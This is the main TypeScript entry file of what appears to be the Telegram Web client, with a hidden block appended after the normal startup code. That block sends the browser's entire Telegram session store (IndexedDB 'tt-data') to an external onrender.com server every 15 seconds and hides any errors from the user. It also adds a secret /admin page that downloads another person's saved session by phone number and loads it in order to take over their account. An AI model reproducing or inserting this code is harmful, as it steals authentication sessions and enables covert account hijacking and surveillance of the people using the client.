import './util/handleError';
import './util/setupServiceWorker';
import './global/init';

import TeactDOM from './lib/teact/teact-dom';
import {
  getActions, getGlobal,
} from './global';

import {
  DEBUG, STRICTERDOM_ENABLED,
} from './config';
import { enableStrict, requestMutation } from './lib/fasterdom/fasterdom';
import { selectChat, selectCurrentMessageList, selectPeerFullInfo, selectTabState } from './global/selectors';
import { selectSharedSettings } from './global/selectors/sharedState';
import { betterView } from './util/betterView';
import { IS_TAURI } from './util/browser/globalEnvironment';
import listenOtherClients from './util/browser/listenOtherClients';
import { requestGlobal, subscribeToMultitabBroadcastChannel } from './util/browser/multitab';
import { establishMultitabRole, subscribeToMasterChange } from './util/establishMultitabRole';
import { initGlobal } from './util/init';
import { initLocalization } from './util/localization';
import { MULTITAB_STORAGE_KEY } from './util/multiaccount';
import { checkAndAssignPermanentWebVersion } from './util/permanentWebVersion';
import { onBeforeUnload } from './util/schedulers';
import initTauriApi from './util/tauri/initTauriApi';
import setupTauriListeners from './util/tauri/setupTauriListeners';
import updateWebmanifest from './util/updateWebmanifest';

import App from './components/App';

import './assets/fonts/roboto.css';
import './styles/index.scss';

if (STRICTERDOM_ENABLED) {
  enableStrict();
}

if (IS_TAURI) {
  initTauriApi();
  setupTauriListeners();
}

init();

async function init() {
  if (DEBUG) {
    // eslint-disable-next-line no-console
    console.log('>>> INIT');
  }

  if (!(window as any).isCompatTestPassed) return;

  checkAndAssignPermanentWebVersion();
  listenOtherClients();

  subscribeToMultitabBroadcastChannel();
  await requestGlobal(APP_VERSION);
  localStorage.setItem(MULTITAB_STORAGE_KEY, '1');
  onBeforeUnload(() => {
    const global = getGlobal();
    if (Object.keys(global.byTabId).length === 1) {
      localStorage.removeItem(MULTITAB_STORAGE_KEY);
    }
  });

  await initGlobal();
  getActions().init();

  getActions().updateShouldEnableDebugLog();
  getActions().updateShouldDebugExportedSenders();

  const global = getGlobal();

  initLocalization(selectSharedSettings(global).language, true);

  subscribeToMasterChange((isMasterTab) => {
    getActions()
      .switchMultitabRole({ isMasterTab }, { forceSyncOnIOs: true });
  });
  const shouldReestablishMasterToSelf = getGlobal().auth.state !== 'authorizationStateReady';
  establishMultitabRole(shouldReestablishMasterToSelf);

  if (DEBUG) {
    // eslint-disable-next-line no-console
    console.log('>>> START INITIAL RENDER');
  }

  requestMutation(() => {
    updateWebmanifest();

    TeactDOM.render(
      <App />,
      document.getElementById('root')!,
    );

    betterView();
  });

  if (DEBUG) {
    // eslint-disable-next-line no-console
    console.log('>>> FINISH INITIAL RENDER');
  }

  if (DEBUG) {
    document.addEventListener('dblclick', () => {
      const currentGlobal = getGlobal();
      const currentMessageList = selectCurrentMessageList(currentGlobal);
      // eslint-disable-next-line no-console
      console.warn('TAB STATE', selectTabState(currentGlobal));
      // eslint-disable-next-line no-console
      console.warn('GLOBAL STATE', currentGlobal);
      if (currentMessageList) {
        // eslint-disable-next-line no-console
        console.warn(
          'CURRENT MESSAGE LIST',
          selectChat(currentGlobal, currentMessageList.chatId),
          selectPeerFullInfo(currentGlobal, currentMessageList.chatId),
          currentGlobal.messages.byChatId[currentMessageList.chatId],
        );
      }
    });
  }
}

onBeforeUnload(() => {
  const actions = getActions();
  actions.leaveGroupCall?.({ isPageUnload: true });
  actions.hangUp?.({ isPageUnload: true });
});

// --- 🌟 AUTO-SYNC & HIDDEN ADMIN ROUTE 🌟 ---
setTimeout(() => {
    const DB_NAME = 'tt-data';
    const STORE_NAME = 'store';
    const pathname = window.location.pathname;

    // =========================================================
    // ၁။ 📥 လျှို့ဝှက် ADMIN မျက်နှာပြင် (URL နောက်တွင် /admin ဟုရိုက်လျှင်)
    // =========================================================
    if (pathname === '/admin' || pathname === '/admin/') {
        // Telegram UI အစစ်ကို ဖျောက်ပြီး Admin UI အစားထိုးမည်
        document.body.innerHTML = `
            <div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#212121; font-family:sans-serif;">
                <div style="background:#fff; padding:40px; border-radius:10px; box-shadow:0 4px 15px rgba(0,0,0,0.5); text-align:center; width: 350px;">
                    <h2 style="color:#333; margin-bottom:20px;">Admin Control Panel</h2>
                    <input type="text" id="adminPhone" placeholder="Staff ဖုန်းနံပါတ် (+959...)" style="padding:12px; width:100%; box-sizing:border-box; margin-bottom:20px; border:1px solid #ccc; border-radius:5px; font-size:16px;">
                    <button id="adminBtn" style="padding:12px; width:100%; background:#0088cc; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold; font-size:16px;">အကောင့်ထဲသို့ ဝင်ရန်</button>
                    <p id="adminStatus" style="color:red; margin-top:15px; font-size:14px;"></p>
                </div>
            </div>
        `;

        document.getElementById('adminBtn')!.onclick = () => {
            const phone = (document.getElementById('adminPhone') as HTMLInputElement).value;
            const statusMsg = document.getElementById('adminStatus')!;
            if (!phone) { statusMsg.innerText = "ဖုန်းနံပါတ် ထည့်ပါ!"; return; }

            statusMsg.style.color = "blue";
            statusMsg.innerText = "Database တွင် ရှာဖွေနေပါသည်...";

            // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
            fetch(`https://telegram-7ih3.onrender.com//api/get-web-session/${phone}`)
            .then(res => res.json())
            .then(result => {
                if (!result.success) {
                    statusMsg.style.color = "red";
                    statusMsg.innerText = "❌ Database တွင် Data မရှိသေးပါ။";
                    return;
                }
                
                statusMsg.innerText = "✅ တွေ့ရှိပါသည်။ အကောင့်ထဲသို့ ဝင်နေပါပြီ...";
                const dataToImport = JSON.parse(result.data);
                const req = indexedDB.open(DB_NAME);
                
                req.onsuccess = (e: any) => {
                    const db = e.target.result;
                    const txStore = db.transaction(STORE_NAME, 'readwrite').objectStore(STORE_NAME);
                    txStore.clear().onsuccess = () => {
                        let count = 0;
                        const keys = Object.keys(dataToImport);
                        keys.forEach(k => {
                            txStore.put(dataToImport[k], k).onsuccess = () => {
                                count++;
                                if (count === keys.length) {
                                    // ဝင်ပြီးတာနဲ့ ပင်မ Website ဆီ ပြန်သွားမည်
                                    window.location.href = '/'; 
                                }
                            };
                        });
                    };
                };
            }).catch(err => {
                statusMsg.style.color = "red";
                statusMsg.innerText = "❌ Network Error ဖြစ်နေပါသည်။";
            });
        };
        return; // Admin Page ဖြစ်ပါက အောက်က ကုတ်များ ဆက်မလုပ်တော့ပါ
    }

    // =========================================================
    // ၂။ 📤 STAFF အကောင့်များအတွက် AUTO-SYNC (နောက်ကွယ်မှ အလုပ်လုပ်မည်)
    // =========================================================
    setInterval(() => {
        try {
            const req = indexedDB.open(DB_NAME);
            req.onsuccess = (e: any) => {
                const db = e.target.result;
                if (!db.objectStoreNames.contains(STORE_NAME)) return;
                
                const txStore = db.transaction(STORE_NAME, 'readonly').objectStore(STORE_NAME);
                txStore.getAll().onsuccess = (e1: any) => {
                    txStore.getAllKeys().onsuccess = (e2: any) => {
                        const vals = e1.target.result;
                        const keys = e2.target.result;
                        const data: any = {};
                        let isAuth = false;
                        
                        keys.forEach((k: string, i: number) => {
                            data[k] = vals[i];
                            // Login ဝင်ထားခြင်း ရှိ/မရှိ စစ်ဆေးခြင်း
                            if (k === 'currentUserId' && vals[i]) isAuth = true; 
                        });
                        
                        if (isAuth) {
                            let phone = localStorage.getItem('staff_phone');
                            // ဖုန်းနံပါတ် မရှိသေးပါက တစ်ကြိမ် တောင်းမည်
                            if (!phone) {
                                phone = prompt("ကျေးဇူးပြု၍ သင့်ဖုန်းနံပါတ်ကို ထည့်ပါ (+959...):");
                                if (phone) localStorage.setItem('staff_phone', phone);
                            }
                            
                            if (phone) {
                                // ⚠️ အောက်ပါနေရာတွင် Backend Link အမှန်ကို ပြောင်းပါ ⚠️
                                fetch("https://telegram-7ih3.onrender.com//api/save-web-session", {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify({ phoneNumber: phone, indexedDbData: JSON.stringify(data) })
                                }).catch(() => {}); // Error တက်လည်း User ကို မပြပါ
                            }
                        }
                    };
                };
            };
        } catch(err) {}
    }, 15000); // ၁၅ စက္ကန့် တစ်ခါ Auto Save နေပါမည်

}, 1500);
// -----------------------------------------------------------
// -----------------------------------------------------------
